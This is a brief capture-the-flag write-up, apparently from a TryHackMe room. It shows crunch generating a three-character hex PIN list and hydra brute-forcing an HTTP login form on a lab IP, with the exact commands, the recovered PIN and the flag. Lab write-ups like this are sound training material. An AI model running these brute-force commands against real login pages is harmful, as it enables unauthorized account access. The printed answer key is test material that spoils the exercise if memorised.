<h3> Hydra/Crunch </h3>
<b>Background:</b>
-Crunch generates a list of password based on the criteria you give it 
```
crunch <min> <max> <characterSet> -o <outputFile>
```
Used command:
```
crunch 3 3 0123456789ABCDEF -o 3digits.txt
```

-Hydra is a password cracker
```
hydra -l <loginName> -P <passwordFile> -f (stopsWhenPasswordFound) -v (verbose) <ip> http-post-form -s <portNum> "/login.php:pin=^PASS^:Access denied"
```

Used command:
```
hydra -l '' -P 3digits.txt -f -v 10.10.116.246 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```

<b>Question:</b>
-Using crunch and hydra, find the PIN code to access the control system and unlock the door. Password: 6F5 Flag: THM{pin-code-brute-force}